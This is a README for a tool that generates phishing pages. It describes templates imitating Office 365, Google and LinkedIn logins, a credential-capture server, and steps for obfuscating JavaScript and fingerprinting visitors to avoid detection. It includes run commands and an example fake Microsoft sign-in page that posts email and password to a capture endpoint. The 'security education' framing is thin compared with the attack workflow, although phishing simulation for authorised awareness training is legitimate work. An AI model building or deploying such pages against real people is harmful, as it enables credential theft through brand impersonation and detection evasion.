# Automated Phishing Page Builder

## What the Tool is For:
A security education tool that rapidly generates phishing page templates for penetration testing labs, security awareness training, and red team exercises. Creates convincing login portals that mimic popular services.

## About:
This tool automates the creation of realistic-looking phishing pages for authorized security testing. It includes templates for common services, credential capture mechanisms, and security education features.

## General Algorithm:
```
1. Template Selection & Customization
   - Choose from popular service templates
   - Customize logos, colors, and text
   - Add target organization branding

2. Credential Capture Setup
   - Configure data collection endpoints
   - Implement form validation
   - Add hidden fields for metadata

3. Evasion & Detection Avoidance
   - Obfuscate JavaScript code
   - Implement basic fingerprinting
   - Add legitimate-looking elements

4. Security Education Features
   - Post-capture educational messages
   - Security tips and best practices
   - Reporting mechanisms

5. Deployment Packaging
   - Generate standalone HTML files
   - Create configuration files
   - Package with documentation
```

## How to Run the Code:

### Python Version:
```bash
# Install dependencies
pip install jinja2

# List available templates
python3 phishing_builder.py --list-templates

# Generate specific template
python3 phishing_builder.py --template office365

# Generate all templates with capture server
python3 phishing_builder.py --start-capture --port 8080

# Custom output directory
python3 phishing_builder.py --template google --output-dir my_pages
```

### C Version:
```bash
# Compile
gcc -o phishing_builder phishing_builder.c

# Run
./phishing_builder
```

## Example Generated Pages:

### Office 365 Phishing Page:
```html
<!-- Generated office365_phishing.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Office 365</title>
    <!-- Professional Microsoft-styled CSS -->
</head>
<body>
    <div class="login-container">
        <div class="microsoft-logo">Microsoft</div>
        <h1>Sign in</h1>
        <form action="http://localhost:8080/capture" method="POST">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="session_id" value="a1b2c3d4e5f6g7h8">
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
```

## Key Features:

1. **Realistic Templates**: Office 365, Google, LinkedIn, and more
2. **Credential Capture**: Configurable endpoints for data collection
3. **Security Education**: Built-in awareness messages and training
4. **Customization**: Easy branding and content modification
5. **Legal Compliance**: Clear educational purpose statements

## Educational Value:

This tool teaches:
- Phishing attack mechanics and psychology
- Social engineering techniques
- Web application security
- Security awareness and training
- Defensive security measures
- Ethical testing methodologies
